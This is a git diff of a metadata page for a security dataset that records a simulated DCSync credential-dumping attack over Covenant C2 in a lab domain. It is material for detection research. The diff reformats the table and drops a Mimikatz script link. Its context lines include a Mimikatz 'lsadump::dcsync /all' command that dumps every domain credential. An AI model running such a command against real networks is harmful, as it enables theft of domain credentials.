@@ -3,16 +3,14 @@
 ## Metadata
 
 
-|                   |    |
-|:------------------|:---|
-| id                | SDWIN-191027064128 |
-| author            | Roberto Rodriguez @Cyb3rWard0g |
-| creation date     | 2019/10/27 |
-| platform          | Windows |
-| Mordor Environment| Mordor shire |
-| Simulation Type   | C2 |
-| Simulation Tool   | Covenant |
-| Simulation Script | https://github.com/cobbr/SharpSploit/blob/master/SharpSploit/Credentials/Mimikatz.cs |
+|                       |    |
+|:----------------------|:---|
+| id                    | SDWIN-191027064128 |
+| author                | Roberto Rodriguez @Cyb3rWard0g |
+| creation date         | 2019/10/27 |
+| platform              | Windows |
+| Simulaton Environment | Mordor shire |
+| Simulation Scripts    | [] |
 | Dataset           | https://raw.githubusercontent.com/OTRF/mordor/master/datasets/small/windows/credential_access/covenant_dcsync_all.tar.gz |
 | References        | None |
 
@@ -26,10 +24,10 @@ Covenant Commands
 Mimikatz /command:"\"lsadump::dcsync /domain:shire.com /all /csv\""
 
   .#####.   mimikatz 2.2.0 (x64) #18362 Oct  8 2019 14:30:39
- .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
- ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
- ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
- '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+.## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+## \ / ##       > http://blog.gentilkiwi.com/mimikatz
+'## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
   '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/
 
 mimikatz(powershell) # lsadump::dcsync /domain:shire.com /all /csv
